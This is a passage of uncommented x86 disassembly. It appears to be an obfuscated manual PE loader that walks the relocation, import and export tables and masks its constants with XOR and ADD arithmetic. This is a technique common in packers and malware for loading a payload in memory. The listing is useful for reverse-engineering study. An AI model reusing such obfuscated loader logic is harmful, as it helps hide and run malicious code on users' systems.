  425836:	mov    DWORD PTR [ebp-0x68],eax
  425839:	mov    eax,DWORD PTR [ebp-0x1c]
  42583c:	xor    eax,esi
  42583e:	add    eax,edi
  425840:	mov    DWORD PTR [ebp-0x64],eax
  425843:	lea    eax,[ebp-0x20]
  425846:	mov    DWORD PTR [ebp-0x60],eax
  425849:	lea    eax,[ebp-0x70]
  42584c:	push   eax
  42584d:	mov    eax,DWORD PTR [ebp+0x8]
  425850:	xor    eax,esi
  425852:	add    eax,edi
  425854:	push   eax
  425855:	mov    eax,DWORD PTR [ebp+0x20]
  425858:	add    eax,0xee
  42585d:	push   eax
  42585e:	mov    eax,DWORD PTR [ebp+0x20]
  425861:	mov    eax,DWORD PTR [eax+0x198]
  425867:	mov    DWORD PTR [ebp-0x70],0x4
  42586e:	push   DWORD PTR [eax]
  425870:	mov    eax,DWORD PTR [ebp+0x10]
  425873:	call   eax
  425875:	test   eax,eax
  425877:	je     0x42589c
  425879:	and    DWORD PTR [ebp+0xc],0x0
  42587d:	cmp    DWORD PTR [ebx+0x50],0x0
  425881:	jbe    0x42589c
  425883:	mov    eax,DWORD PTR [ebp+0x1c]
  425886:	mov    ecx,DWORD PTR [ebp-0x10]
  425889:	sub    ecx,eax
  42588b:	mov    dl,BYTE PTR [ecx+eax*1]
  42588e:	inc    DWORD PTR [ebp+0xc]
  425891:	mov    BYTE PTR [eax],dl
  425893:	mov    edx,DWORD PTR [ebp+0xc]
  425896:	inc    eax
  425897:	cmp    edx,DWORD PTR [ebx+0x50]
  42589a:	jb     0x42588b
  42589c:	mov    edx,DWORD PTR [ebp+0x1c]
  42589f:	mov    ecx,DWORD PTR [edx+0x3c]
  4258a2:	add    ecx,edx
  4258a4:	mov    eax,DWORD PTR [ecx+0xa0]
  4258aa:	mov    ebx,DWORD PTR [ecx+0x28]
  4258ad:	add    eax,edx
  4258af:	sub    edx,DWORD PTR [ebp-0x10]
  4258b2:	add    ebx,DWORD PTR [ebp+0x1c]
  4258b5:	mov    DWORD PTR [ebp+0xc],edx
  4258b8:	mov    DWORD PTR [ebp-0x2c],ecx
  4258bb:	mov    DWORD PTR [ebp-0x14],ebx
  4258be:	mov    DWORD PTR [ebp-0x8],0x0
  4258c5:	jmp    0x425941
  4258c7:	add    edx,0xfffffff8
  4258ca:	shr    edx,1
  4258cc:	mov    DWORD PTR [ebp-0x18],edx
  4258cf:	je     0x42592d
  4258d1:	lea    edx,[eax+0x8]
  4258d4:	mov    DWORD PTR [ebp-0x4],edx
  4258d7:	mov    edx,DWORD PTR [ebp-0x18]
  4258da:	mov    DWORD PTR [ebp-0x18],edx
  4258dd:	mov    edx,DWORD PTR [ebp-0x4]
  4258e0:	movzx  edx,WORD PTR [edx]
  4258e3:	mov    DWORD PTR [ebp-0x24],edx
  4258e6:	and    edx,0xfff
  4258ec:	mov    DWORD PTR [ebp-0x28],edx
  4258ef:	mov    edx,DWORD PTR [ebp-0x24]
  4258f2:	shr    edx,0xc
  4258f5:	add    edx,0xffcd8d0a
  4258fb:	xor    edx,esi
  4258fd:	cmp    edx,0xf89c85a2
  425903:	jne    0x425924
  425905:	mov    edx,DWORD PTR [ebp-0x28]
  425908:	add    edx,DWORD PTR [ebp+0x1c]
  42590b:	mov    ebx,DWORD PTR [eax]
  42590d:	cmp    DWORD PTR [ebx+edx*1],0x0
  425911:	je     0x425921
  425913:	mov    ecx,DWORD PTR [ebp+0xc]
  425916:	add    ecx,DWORD PTR [ebx+edx*1]
  425919:	mov    ebx,DWORD PTR [eax]
  42591b:	mov    DWORD PTR [edx+ebx*1],ecx
  42591e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425921:	mov    ebx,DWORD PTR [ebp-0x14]
  425924:	add    DWORD PTR [ebp-0x4],0x2
  425928:	dec    DWORD PTR [ebp-0x18]
  42592b:	jne    0x4258dd
  42592d:	mov    edx,DWORD PTR [ebp-0xc]
  425930:	add    DWORD PTR [ebp-0x8],edx
  425933:	mov    edx,DWORD PTR [ebp-0x8]
  425936:	cmp    edx,DWORD PTR [ecx+0xa4]
  42593c:	jae    0x42594f
  42593e:	add    eax,DWORD PTR [ebp-0xc]
  425941:	mov    edx,DWORD PTR [eax+0x4]
  425944:	mov    DWORD PTR [ebp-0xc],edx
  425947:	test   edx,edx
  425949:	jne    0x4258c7
  42594f:	mov    eax,DWORD PTR [ebp-0x10]
  425952:	mov    DWORD PTR [ebp-0x6c],eax
  425955:	mov    DWORD PTR [ebp-0x70],0x4
  42595c:	mov    eax,DWORD PTR [ecx+0x50]
  42595f:	mov    DWORD PTR [ebp-0x68],eax
  425962:	mov    eax,DWORD PTR [ebp-0x1c]
  425965:	xor    eax,esi
  425967:	add    eax,edi
  425969:	mov    DWORD PTR [ebp-0x64],eax
  42596c:	lea    eax,[ebp-0x20]
  42596f:	mov    DWORD PTR [ebp-0x60],eax
  425972:	lea    eax,[ebp-0x70]
  425975:	push   eax
  425976:	mov    eax,DWORD PTR [ebp+0x8]
  425979:	xor    eax,esi
  42597b:	add    eax,edi
  42597d:	push   eax
  42597e:	mov    eax,DWORD PTR [ebp+0x20]
  425981:	add    eax,0xee
  425986:	push   eax
  425987:	mov    eax,DWORD PTR [ebp+0x20]
  42598a:	mov    eax,DWORD PTR [eax+0x198]
  425990:	push   DWORD PTR [eax]
  425992:	mov    eax,DWORD PTR [ebp+0x10]
  425995:	call   eax
  425997:	mov    eax,DWORD PTR [ebp+0x20]
  42599a:	mov    eax,DWORD PTR [eax+0x180]
  4259a0:	add    eax,DWORD PTR [ebp+0xc]
  4259a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259a6:	push   DWORD PTR [ebp+0x18]
  4259a9:	mov    DWORD PTR [eax],ecx
  4259ab:	push   DWORD PTR [ebp+0x14]
  4259ae:	push   DWORD PTR [ebp+0x1c]
  4259b1:	call   ebx
  4259b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259b6:	add    ecx,DWORD PTR [ebp+0x20]
  4259b9:	lea    eax,[ebp+0x4]
  4259bc:	mov    DWORD PTR [ebp+0x20],ecx
  4259bf:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c2:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c5:	mov    edx,DWORD PTR [ecx+0x190]
  4259cb:	mov    ecx,DWORD PTR [ebp+0x20]
  4259ce:	mov    ecx,DWORD PTR [ecx+0x18c]
  4259d4:	mov    esi,DWORD PTR [ecx]
  4259d6:	cmp    DWORD PTR [eax],esi
  4259d8:	jb     0x4259f9
  4259da:	mov    esi,DWORD PTR [edx]
  4259dc:	mov    edi,DWORD PTR [edx]
  4259de:	mov    esi,DWORD PTR [esi+0x3c]
  4259e1:	lea    esi,[edi+esi*1+0x50]
  4259e5:	mov    edi,DWORD PTR [ecx]
  4259e7:	add    edi,DWORD PTR [esi]
  4259e9:	cmp    DWORD PTR [eax],edi
  4259eb:	jae    0x4259f9
  4259ed:	mov    esi,DWORD PTR [ecx]
  4259ef:	mov    ecx,DWORD PTR [eax]
  4259f1:	mov    edx,DWORD PTR [edx]
  4259f3:	sub    ecx,esi
  4259f5:	add    edx,ecx
  4259f7:	mov    DWORD PTR [eax],edx
  4259f9:	mov    eax,DWORD PTR [ebp+0xc]
  4259fc:	jmp    0x425a00
  4259fe:	xor    eax,eax
  425a00:	pop    edi
  425a01:	pop    esi
  425a02:	pop    ebx
  425a03:	leave  
  425a04:	ret    0x1c
  425a07:	push   ebp
  425a08:	mov    ebp,esp
  425a0a:	sub    esp,0x1c
  425a0d:	push   esi
  425a0e:	mov    esi,eax
  425a10:	mov    eax,DWORD PTR [ecx+0x190]
  425a16:	cmp    DWORD PTR [eax],0x0
  425a19:	je     0x425b29
  425a1f:	test   edx,edx
  425a21:	je     0x425b29
  425a27:	test   esi,esi
  425a29:	je     0x425b29
  425a2f:	mov    eax,DWORD PTR [esi+0x88]
  425a35:	test   eax,eax
  425a37:	je     0x425b24
  425a3d:	cmp    DWORD PTR [esi+0x8c],0x10
  425a44:	je     0x425b24
  425a4a:	cmp    DWORD PTR [esi+0x34],edx
  425a4d:	je     0x425b24
  425a53:	mov    esi,DWORD PTR [ecx+0x18c]
  425a59:	and    DWORD PTR [ebp-0x10],0x0
  425a5d:	mov    ecx,edx
  425a5f:	sub    ecx,DWORD PTR [esi]
  425a61:	add    eax,edx
  425a63:	movzx  edx,WORD PTR [eax+0xc]
  425a67:	mov    DWORD PTR [ebp-0x1c],ecx
  425a6a:	movzx  ecx,WORD PTR [eax+0xe]
  425a6e:	add    ecx,edx
  425a70:	je     0x425b24
  425a76:	lea    ecx,[eax+0x14]
  425a79:	push   ebx
  425a7a:	mov    DWORD PTR [ebp-0x18],ecx
  425a7d:	mov    esi,0x7fffffff
  425a82:	push   edi
  425a83:	test   DWORD PTR [ecx],esi
  425a85:	je     0x425b06
  425a87:	mov    edx,DWORD PTR [ecx]
  425a89:	and    DWORD PTR [ebp-0xc],0x0
  425a8d:	and    edx,esi
  425a8f:	add    edx,eax
  425a91:	movzx  edi,WORD PTR [edx+0xe]
  425a95:	movzx  ebx,WORD PTR [edx+0xc]
  425a99:	add    edi,ebx
  425a9b:	je     0x425b06
  425a9d:	lea    ecx,[edx+0x14]
  425aa0:	mov    DWORD PTR [ebp-0x14],ecx
  425aa3:	test   DWORD PTR [ecx],esi
  425aa5:	je     0x425ae8
  425aa7:	mov    ecx,DWORD PTR [ecx]
  425aa9:	and    DWORD PTR [ebp-0x8],0x0
  425aad:	and    ecx,esi
  425aaf:	add    ecx,eax
  425ab1:	movzx  edi,WORD PTR [ecx+0xe]
  425ab5:	movzx  ebx,WORD PTR [ecx+0xc]
  425ab9:	add    edi,ebx
  425abb:	je     0x425ae8
  425abd:	lea    edi,[ecx+0x14]
  425ac0:	mov    DWORD PTR [ebp-0x4],edi
  425ac3:	mov    edi,DWORD PTR [ebp-0x4]
  425ac6:	mov    edi,DWORD PTR [edi]
  425ac8:	test   edi,edi
  425aca:	je     0x425ad2
  425acc:	mov    ebx,DWORD PTR [ebp-0x1c]
  425acf:	add    DWORD PTR [edi+eax*1],ebx
  425ad2:	movzx  edi,WORD PTR [ecx+0xe]
  425ad6:	movzx  ebx,WORD PTR [ecx+0xc]
  425ada:	inc    DWORD PTR [ebp-0x8]
  425add:	add    DWORD PTR [ebp-0x4],0x8
  425ae1:	add    edi,ebx
  425ae3:	cmp    DWORD PTR [ebp-0x8],edi
  425ae6:	jb     0x425ac3
  425ae8:	movzx  edi,WORD PTR [edx+0xe]
  425aec:	movzx  ebx,WORD PTR [edx+0xc]
  425af0:	mov    ecx,DWORD PTR [ebp-0x14]
  425af3:	inc    DWORD PTR [ebp-0xc]
  425af6:	add    ecx,0x8
  425af9:	add    edi,ebx
  425afb:	mov    DWORD PTR [ebp-0x14],ecx
  425afe:	cmp    DWORD PTR [ebp-0xc],edi
  425b01:	jb     0x425aa3
  425b03:	mov    ecx,DWORD PTR [ebp-0x18]
  425b06:	movzx  edx,WORD PTR [eax+0xe]
  425b0a:	movzx  edi,WORD PTR [eax+0xc]
  425b0e:	inc    DWORD PTR [ebp-0x10]
  425b11:	add    ecx,0x8
  425b14:	add    edx,edi
  425b16:	mov    DWORD PTR [ebp-0x18],ecx
  425b19:	cmp    DWORD PTR [ebp-0x10],edx
  425b1c:	jb     0x425a83
  425b22:	pop    edi
  425b23:	pop    ebx
  425b24:	xor    eax,eax
  425b26:	inc    eax
  425b27:	jmp    0x425b2b
  425b29:	xor    eax,eax
  425b2b:	pop    esi
  425b2c:	leave  
  425b2d:	ret    
  425b2e:	push   ebp
  425b2f:	mov    ebp,esp
  425b31:	mov    ecx,DWORD PTR [ecx+0x190]
  425b37:	mov    eax,DWORD PTR [ebp+0xc]
  425b3a:	sub    esp,0x10
  425b3d:	push   ebx
  425b3e:	xor    ebx,ebx
  425b40:	push   esi
  425b41:	push   edi
  425b42:	cmp    DWORD PTR [ecx],ebx
  425b44:	je     0x425bcc
  425b4a:	cmp    eax,ebx
  425b4c:	je     0x425bcc
  425b4e:	cmp    DWORD PTR [eax+0x78],ebx
  425b51:	jne    0x425b58
  425b53:	xor    eax,eax
  425b55:	inc    eax
  425b56:	jmp    0x425bce
  425b58:	mov    eax,DWORD PTR [eax+0x78]
  425b5b:	add    eax,DWORD PTR [ebp+0x8]
  425b5e:	mov    ecx,DWORD PTR [eax+0x1c]
  425b61:	mov    edx,DWORD PTR [eax+0x24]
  425b64:	mov    esi,DWORD PTR [eax+0x14]
  425b67:	mov    edi,DWORD PTR [eax+0x18]
  425b6a:	add    ecx,DWORD PTR [ebp+0x8]
  425b6d:	add    edx,DWORD PTR [ebp+0x8]
  425b70:	mov    DWORD PTR [ebp-0x4],esi
  425b73:	cmp    esi,edi
  425b75:	ja     0x425b7a
  425b77:	mov    DWORD PTR [ebp-0x4],edi
  425b7a:	mov    DWORD PTR [ebp-0x8],ebx
  425b7d:	cmp    DWORD PTR [ebp-0x4],ebx
  425b80:	jbe    0x425b53
  425b82:	cmp    ebx,DWORD PTR [eax+0x14]
  425b85:	jae    0x425b8d
  425b87:	movzx  esi,WORD PTR [edx+ebx*2]
  425b8b:	jmp    0x425b8f
  425b8d:	mov    esi,ebx
  425b8f:	lea    esi,[ecx+esi*4]
  425b92:	mov    edi,DWORD PTR [esi]
  425b94:	test   edi,edi
  425b96:	je     0x425bc1
  425b98:	add    edi,DWORD PTR [ebp+0x8]
  425b9b:	mov    DWORD PTR [ebp-0x10],edi
  425b9e:	cmp    edi,eax
  425ba0:	jbe    0x425bb2
  425ba2:	mov    ebx,DWORD PTR [ebp+0xc]
  425ba5:	mov    ebx,DWORD PTR [ebx+0x7c]
  425ba8:	add    ebx,eax
  425baa:	cmp    edi,ebx
  425bac:	jae    0x425bb2
  425bae:	mov    esi,DWORD PTR [esi]
  425bb0:	jmp    0x425bba
  425bb2:	sub    edi,DWORD PTR [ebp+0x8]
  425bb5:	mov    DWORD PTR [esi],edi
  425bb7:	mov    esi,DWORD PTR [ebp-0x10]
  425bba:	test   esi,esi
  425bbc:	je     0x425bcc
  425bbe:	mov    ebx,DWORD PTR [ebp-0x8]
  425bc1:	inc    ebx
  425bc2:	mov    DWORD PTR [ebp-0x8],ebx
  425bc5:	cmp    ebx,DWORD PTR [ebp-0x4]
  425bc8:	jb     0x425b82
  425bca:	jmp    0x425b53
  425bcc:	xor    eax,eax
  425bce:	pop    edi
  425bcf:	pop    esi
  425bd0:	pop    ebx
  425bd1:	leave  
  425bd2:	ret    0x8
  425bd5:	push   ebp
  425bd6:	mov    ebp,esp
  425bd8:	sub    esp,0x2c
  425bdb:	mov    edx,0xf89c85a5
  425be0:	mov    DWORD PTR [ebp-0x4],edx
  425be3:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  425bea:	mov    eax,DWORD PTR [ebp-0x4]
  425bed:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf0:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf3:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  425bfc:	push   ebx
  425bfd:	mov    ebx,DWORD PTR [ebp+0x10]
  425c00:	push   esi
  425c01:	mov    esi,0x75108af
  425c06:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  425c0d:	mov    ecx,DWORD PTR [ebp-0x4]
  425c10:	mov    ebx,DWORD PTR [ebx+0x190]
  425c16:	push   edi
  425c17:	mov    edi,0x3272f6
  425c1c:	xor    ecx,esi
  425c1e:	xor    eax,esi
  425c20:	add    eax,edi
  425c22:	add    ecx,edi
  425c24:	mov    DWORD PTR [ebp-0x18],eax
  425c27:	cmp    ecx,DWORD PTR [ebx]
  425c29:	je     0x425eaa
  425c2f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c32:	mov    ecx,DWORD PTR [ebp+0xc]
  425c35:	xor    ebx,esi
  425c37:	add    ebx,edi
  425c39:	cmp    ebx,ecx
  425c3b:	je     0x425eaa
  425c41:	mov    ebx,DWORD PTR [ebp-0x4]
  425c44:	mov    ecx,DWORD PTR [ecx+0x80]
  425c4a:	xor    ebx,esi
  425c4c:	add    ebx,edi
  425c4e:	cmp    ecx,ebx
  425c50:	je     0x425ea5
  425c56:	add    ecx,DWORD PTR [ebp+0x8]
  425c59:	mov    DWORD PTR [ebp-0x2c],ecx
  425c5c:	mov    ebx,edx
  425c5e:	xor    ebx,esi
  425c60:	add    ebx,edi
  425c62:	mov    DWORD PTR [ebp-0x10],ebx
  425c65:	mov    ebx,DWORD PTR [ebp-0x10]
  425c68:	cmp    ebx,edx
  425c6a:	je     0x425c7e
  425c6c:	mov    edx,DWORD PTR [ebp-0x10]
  425c6f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c72:	imul   edx,edx,0x14
  425c75:	xor    ebx,esi
  425c77:	add    ebx,edi
  425c79:	cmp    DWORD PTR [edx+ecx*1],ebx
  425c7c:	jne    0x425c95
  425c7e:	mov    edx,DWORD PTR [ebp-0x10]
  425c81:	mov    ebx,DWORD PTR [ebp-0x4]
  425c84:	imul   edx,edx,0x14
  425c87:	xor    ebx,esi
  425c89:	add    ebx,edi
  425c8b:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425c8f:	je     0x425e97
  425c95:	mov    eax,DWORD PTR [ebp-0x4]
  425c98:	mov    ebx,DWORD PTR [ebp-0x4]
  425c9b:	mov    eax,DWORD PTR [ebp-0x10]
  425c9e:	imul   eax,eax,0x14
  425ca1:	add    eax,ecx
  425ca3:	mov    ecx,DWORD PTR [eax+0x10]
  425ca6:	add    ecx,DWORD PTR [ebp+0x8]
  425ca9:	xor    ebx,esi
  425cab:	mov    DWORD PTR [ebp-0x1c],ecx
  425cae:	mov    ecx,DWORD PTR [ebp-0x4]
  425cb1:	mov    edx,DWORD PTR [ebp-0x4]
  425cb4:	xor    ecx,esi
  425cb6:	add    ecx,edi
  425cb8:	xor    edx,esi
  425cba:	mov    DWORD PTR [ebp-0x24],ecx
  425cbd:	mov    ecx,DWORD PTR [eax]
  425cbf:	add    edx,edi
  425cc1:	add    ebx,edi
  425cc3:	cmp    ecx,edx
  425cc5:	je     0x425ccd
  425cc7:	add    ecx,DWORD PTR [ebp+0x8]
  425cca:	mov    DWORD PTR [ebp-0x24],ecx
  425ccd:	mov    ecx,DWORD PTR [ebp-0x4]
  425cd0:	xor    ecx,esi
  425cd2:	add    ecx,DWORD PTR [eax+0xc]
  425cd5:	mov    eax,DWORD PTR [ebp+0x8]
  425cd8:	lea    eax,[ecx+eax*1+0x3272f6]
  425cdf:	mov    DWORD PTR [ebp+0xc],eax
  425ce2:	mov    DWORD PTR [ebp-0x28],0xf89c85a0
  425ce9:	mov    eax,DWORD PTR [ebp+0x10]
  425cec:	push   DWORD PTR [ebp+0xc]
  425cef:	mov    eax,DWORD PTR [eax+0x1e0]
  425cf5:	call   DWORD PTR [eax]
  425cf7:	mov    ecx,DWORD PTR [ebp-0x4]
  425cfa:	xor    ecx,esi
  425cfc:	add    ecx,edi
  425cfe:	mov    DWORD PTR [ebp-0xc],eax
  425d01:	cmp    ecx,eax
  425d03:	jne    0x425d17
  425d05:	mov    eax,DWORD PTR [ebp+0x10]
  425d08:	push   DWORD PTR [ebp+0xc]
  425d0b:	mov    eax,DWORD PTR [eax+0x1e0]
  425d11:	call   DWORD PTR [eax+0xc]
  425d14:	mov    DWORD PTR [ebp-0xc],eax
  425d17:	mov    DWORD PTR [ebp-0x20],0x7f661b2c
  425d1e:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  425d25:	mov    eax,DWORD PTR [ebp-0x4]
  425d28:	xor    eax,esi
  425d2a:	add    eax,edi
  425d2c:	cmp    eax,DWORD PTR [ebp-0xc]
  425d2f:	jne    0x425d54
  425d31:	mov    eax,DWORD PTR [ebp-0x8]
  425d34:	mov    ecx,DWORD PTR [ebp-0x20]
  425d37:	xor    eax,esi
  425d39:	xor    ecx,esi
  425d3b:	lea    ebx,[ebx+eax*1+0x3272f6]
  425d42:	mov    eax,DWORD PTR [ebp+0x10]
  425d45:	mov    eax,DWORD PTR [eax+0x1e0]
  425d4b:	add    ecx,edi
  425d4d:	imul   ecx,ebx
  425d50:	push   ecx
  425d51:	call   DWORD PTR [eax+0x24]
  425d54:	mov    eax,DWORD PTR [ebp-0x4]
  425d57:	xor    eax,esi
  425d59:	add    eax,edi
  425d5b:	cmp    eax,DWORD PTR [ebp-0xc]
  425d5e:	jne    0x425d6f
  425d60:	mov    eax,DWORD PTR [ebp-0x28]
  425d63:	xor    eax,esi
  425d65:	add    eax,edi
  425d67:	cmp    ebx,eax
  425d69:	jbe    0x425ce9
  425d6f:	mov    eax,DWORD PTR [ebp-0x4]
  425d72:	xor    eax,esi
  425d74:	add    eax,edi
  425d76:	cmp    eax,DWORD PTR [ebp-0xc]
  425d79:	jne    0x425d92
  425d7b:	mov    eax,DWORD PTR [ebp-0x8]
  425d7e:	mov    ecx,DWORD PTR [ebp-0x18]
  425d81:	xor    eax,esi
  425d83:	lea    eax,[ecx+eax*1+0x3272f6]
  425d8a:	mov    DWORD PTR [ebp-0x18],eax
  425d8d:	jmp    0x425e81
  425d92:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  425d99:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  425da0:	mov    ebx,DWORD PTR [ebp-0x4]
  425da3:	xor    ebx,esi
  425da5:	add    ebx,edi
  425da7:	jmp    0x425e6e
  425dac:	mov    eax,DWORD PTR [ebp-0x4]
  425daf:	xor    eax,esi
  425db1:	add    eax,edi
  425db3:	mov    DWORD PTR [ebp-0x14],eax
  425db6:	mov    eax,DWORD PTR [ebp-0x4]
  425db9:	xor    eax,esi
  425dbb:	add    eax,edi
  425dbd:	mov    DWORD PTR [ebp+0xc],eax
  425dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  425dc3:	mov    eax,DWORD PTR [ebp-0x24]
  425dc6:	xor    ecx,esi
  425dc8:	add    ecx,edi
  425dca:	cmp    ecx,eax
  425dcc:	je     0x425dd4
  425dce:	mov    eax,DWORD PTR [eax+ebx*4]
  425dd1:	mov    DWORD PTR [ebp-0x14],eax
  425dd4:	mov    eax,DWORD PTR [ebp-0x1c]
  425dd7:	mov    eax,DWORD PTR [eax+ebx*4]
  425dda:	mov    DWORD PTR [ebp+0xc],eax
  425ddd:	mov    eax,DWORD PTR [ebp-0x4]
  425de0:	mov    ecx,DWORD PTR [ebp-0x14]
  425de3:	xor    eax,esi
  425de5:	add    eax,edi
  425de7:	cmp    eax,ecx
  425de9:	je     0x425e14
  425deb:	mov    eax,DWORD PTR [ebp-0x4]
  425dee:	mov    ecx,DWORD PTR [ebp-0x14]
  425df1:	xor    eax,esi
  425df3:	add    eax,edi
  425df5:	shr    ecx,0x1f
  425df8:	cmp    eax,ecx
  425dfa:	je     0x425e14
  425dfc:	mov    ecx,DWORD PTR [ebp-0x14]
  425dff:	mov    eax,DWORD PTR [ebp+0x10]
  425e02:	mov    eax,DWORD PTR [eax+0x1e0]
  425e08:	movzx  ecx,cx
  425e0b:	push   ecx
  425e0c:	push   DWORD PTR [ebp-0xc]
  425e0f:	call   DWORD PTR [eax+0x8]
  425e12:	jmp    0x425e2d
  425e14:	mov    eax,DWORD PTR [ebp+0xc]
  425e17:	add    eax,DWORD PTR [ebp+0x8]
  425e1a:	mov    ecx,DWORD PTR [ebp+0x10]
  425e1d:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425e23:	add    eax,0x2
  425e26:	push   eax
  425e27:	push   DWORD PTR [ebp-0xc]
  425e2a:	call   DWORD PTR [ecx+0x8]
  425e2d:	mov    DWORD PTR [ebp+0xc],eax
  425e30:	mov    eax,DWORD PTR [ebp-0x4]
  425e33:	mov    ecx,DWORD PTR [ebp+0xc]
  425e36:	xor    eax,esi
  425e38:	add    eax,edi
  425e3a:	cmp    eax,ecx
  425e3c:	mov    eax,DWORD PTR [ebp-0x8]
  425e3f:	jne    0x425e52
  425e41:	mov    ecx,DWORD PTR [ebp-0x18]
  425e44:	xor    eax,esi
  425e46:	lea    eax,[ecx+eax*1+0x3272f6]
  425e4d:	mov    DWORD PTR [ebp-0x18],eax
  425e50:	jmp    0x425e62
  425e52:	mov    ecx,DWORD PTR [ebp+0xc]
  425e55:	xor    eax,esi
  425e57:	add    eax,edi
  425e59:	imul   eax,ecx
  425e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e5f:	mov    DWORD PTR [ecx+ebx*4],eax
  425e62:	mov    eax,DWORD PTR [ebp-0x8]
  425e65:	xor    eax,esi
  425e67:	lea    ebx,[ebx+eax*1+0x3272f6]
  425e6e:	mov    eax,DWORD PTR [ebp-0x4]
  425e71:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e74:	xor    eax,esi
  425e76:	add    eax,edi
  425e78:	cmp    DWORD PTR [ecx+ebx*4],eax
  425e7b:	jne    0x425dac
  425e81:	mov    edx,DWORD PTR [ebp-0x10]
  425e84:	mov    eax,DWORD PTR [ebp-0x18]
  425e87:	mov    ecx,DWORD PTR [ebp-0x2c]
  425e8a:	sub    edx,0x3272f5
  425e90:	xor    edx,esi
  425e92:	jmp    0x425c5c
  425e97:	mov    ecx,DWORD PTR [ebp-0x4]
  425e9a:	xor    ecx,esi
  425e9c:	add    ecx,edi
  425e9e:	cmp    eax,ecx
  425ea0:	mov    eax,DWORD PTR [ebp-0x4]
  425ea3:	jne    0x425ead
  425ea5:	mov    eax,DWORD PTR [ebp-0x8]
  425ea8:	jmp    0x425ead
  425eaa:	mov    eax,DWORD PTR [ebp-0x4]
  425ead:	xor    eax,esi
  425eaf:	add    eax,edi
  425eb1:	pop    edi
  425eb2:	pop    esi
  425eb3:	pop    ebx
  425eb4:	leave  
  425eb5:	ret    0xc
  425eb8:	push   ebp
  425eb9:	mov    ebp,esp
  425ebb:	sub    esp,0x28
  425ebe:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  425ec5:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  425ecc:	mov    eax,DWORD PTR [ebp+0xc]
  425ecf:	mov    DWORD PTR [ebp+0xc],eax
  425ed2:	push   esi
  425ed3:	mov    eax,eax
  425ed5:	mov    eax,DWORD PTR [ebp-0x4]
  425ed8:	mov    esi,DWORD PTR [ebp+0x8]
  425edb:	mov    ecx,0x75108af
  425ee0:	xor    eax,ecx
  425ee2:	mov    edx,0x3272f6
  425ee7:	add    eax,edx
  425ee9:	cmp    esi,eax
  425eeb:	je     0x426012
  425ef1:	mov    eax,DWORD PTR [ebp+0x8]
  425ef4:	mov    esi,DWORD PTR [ebp+0x8]
  425ef7:	add    esi,DWORD PTR [eax+0x3c]
  425efa:	push   edi
  425efb:	mov    DWORD PTR [ebp+0xc],esi
  425efe:	mov    DWORD PTR [ebp-0x1c],0xf89c85a0
  425f05:	mov    eax,DWORD PTR [ebp-0x1c]
  425f08:	mov    esi,DWORD PTR [ebp-0x4]
  425f0b:	mov    edi,DWORD PTR [ebp+0xc]
  425f0e:	xor    esi,ecx
  425f10:	xor    eax,ecx
  425f12:	add    esi,edx
  425f14:	cmp    DWORD PTR [edi+eax*8+0x1939828],esi
  425f1b:	je     0x42600c
  425f21:	mov    esi,DWORD PTR [ebp+0xc]
  425f24:	mov    eax,DWORD PTR [ebp+0x8]
  425f27:	add    eax,DWORD PTR [esi+0xa0]
  425f2d:	mov    esi,DWORD PTR [ebp+0x8]
  425f30:	mov    edi,DWORD PTR [ebp+0xc]
  425f33:	sub    esi,DWORD PTR [edi+0x34]
  425f36:	mov    edi,DWORD PTR [ebp-0x4]
  425f39:	xor    edi,ecx
  425f3b:	add    edi,edx
  425f3d:	mov    DWORD PTR [ebp-0x24],esi
  425f40:	cmp    esi,edi
  425f42:	je     0x42600c
  425f48:	mov    esi,DWORD PTR [ebp-0x4]
  425f4b:	xor    esi,ecx
  425f4d:	add    esi,edx
  425f4f:	mov    DWORD PTR [ebp-0x8],esi
  425f52:	push   ebx
  425f53:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  425f5a:	jmp    0x425ff6
  425f5f:	mov    esi,DWORD PTR [ebp-0x4]
  425f62:	xor    esi,ecx
  425f64:	lea    edi,[ebx-0x8]
  425f67:	add    esi,edx
  425f69:	shr    edi,1
  425f6b:	cmp    esi,edi
  425f6d:	jae    0x425fdc
  425f6f:	sub    edi,esi
  425f71:	lea    ebx,[eax+esi*2+0x8]
  425f75:	mov    DWORD PTR [ebp-0x18],edi
  425f78:	movzx  esi,WORD PTR [ebx]
  425f7b:	and    esi,0xfff
  425f81:	mov    DWORD PTR [ebp-0x14],esi
  425f84:	mov    edi,DWORD PTR [ebp-0x14]
  425f87:	mov    esi,DWORD PTR [eax]
  425f89:	sub    esi,edx
  425f8b:	add    edi,esi
  425f8d:	movzx  esi,WORD PTR [ebx]
  425f90:	shr    esi,0xc
  425f93:	xor    edi,ecx
  425f95:	mov    DWORD PTR [ebp-0x20],edi
  425f98:	mov    DWORD PTR [ebp-0x14],esi
  425f9b:	mov    esi,DWORD PTR [ebp-0x20]
  425f9e:	mov    edi,DWORD PTR [ebp+0x8]
  425fa1:	xor    esi,ecx
  425fa3:	lea    esi,[esi+edi*1+0x3272f6]
  425faa:	mov    DWORD PTR [ebp-0x20],esi
  425fad:	mov    esi,DWORD PTR [ebp-0x10]
  425fb0:	mov    edi,DWORD PTR [ebp-0x14]
  425fb3:	xor    esi,ecx
  425fb5:	add    esi,edx
  425fb7:	cmp    edi,esi
  425fb9:	jne    0x425fd1
  425fbb:	mov    esi,DWORD PTR [ebp-0x10]
  425fbe:	mov    edi,DWORD PTR [ebp-0x14]
  425fc1:	xor    esi,ecx
  425fc3:	add    esi,edx
